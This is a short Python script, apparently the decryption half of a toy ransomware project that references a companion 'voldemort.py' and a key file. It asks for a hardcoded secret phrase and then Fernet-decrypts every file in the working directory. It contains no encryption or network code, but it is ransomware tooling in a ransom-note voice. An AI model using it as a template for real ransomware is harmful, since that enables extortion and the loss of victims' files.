#!/usr/bin/env/ python3

import os

from cryptography.fernet import Fernet


#lets find some files

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key","rb") as key:
	secretkey = key.read()

secretphrase = "NoSystemIsSafe"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:

	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)


	print("Congrats!!Your files are decrpted now")
else:
	print("You screwed up its incorrect, you can only encrypt with the key or secretphrase")


